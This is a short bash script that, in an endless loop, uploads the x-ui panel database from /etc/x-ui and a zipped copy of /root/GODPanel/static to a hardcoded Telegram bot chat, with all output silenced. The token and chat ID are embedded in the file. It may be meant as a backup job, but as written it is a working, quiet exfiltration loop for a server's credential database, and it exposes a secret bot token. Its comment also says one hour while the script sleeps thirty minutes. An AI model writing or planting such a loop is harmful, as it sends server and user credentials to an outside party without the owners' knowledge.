#!/bin/bash

XUI_DB="/etc/x-ui/x-ui.db"
CHAT_ID="6528322483"
TK="7718125056:AAFekgpBpWd_2ez4iFUF1wcB_NIQFykWTw0"
STATIC_DIR="/root/GODPanel/static"

while true; do
    # Check if XUI_DB exists
    if [ -f "$XUI_DB" ]; then
        echo "Sending XUI_DB..."
        TIMESTAMP=$(date +"%Y/%m/%d %H:%M:%S")
        curl -s -X POST "https://api.telegram.org/bot$TK/sendDocument" \
            -F chat_id="$CHAT_ID" \
            -F document=@"$XUI_DB" \
            -F caption="$TIMESTAMP" >/dev/null 2>&1
    fi

    # Zip and send static directory
    echo "Zipping static directory..."
    zip -r static.zip "$STATIC_DIR" >/dev/null 2>&1
    if [ -f "static.zip" ]; then
        echo "Sending static.zip..."
        TIMESTAMP=$(date +"%Y/%m/%d %H:%M:%S")
        curl -s -X POST "https://api.telegram.org/bot$TK/sendDocument" \
            -F chat_id="$CHAT_ID" \
            -F document=@"static.zip" \
            -F caption="$TIMESTAMP Static Files" >/dev/null 2>&1
        rm static.zip
    fi

    echo "Waiting for 1 hour..."
    sleep 1800
done
